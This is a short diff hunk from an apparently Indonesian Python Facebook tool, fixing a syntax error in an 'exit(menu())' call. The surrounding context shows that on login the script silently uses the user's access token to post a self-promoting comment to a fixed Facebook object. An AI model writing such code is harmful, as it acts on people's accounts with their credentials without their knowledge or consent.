@@ -93,7 +93,7 @@ def menu_log():
             requests.post("https://graph.facebook.com/800676813861801/comments?message=Raka Orang Terganteng diindonesia !&access_token="+token)
             print('%s║'%(O)) 
             print('%s╚══®[%s!%s]◍➤ %sLogin Berhasil'%(O,P,O,P)) 
-            exit(.menu())
+            exit(menu())
         except requests.exceptions.ConnectionError:
             print('%s║'%(O))
             jalan('%s╚══®[%s!%s]◍➤ %sConnection Problem'%(M,P,M,P))
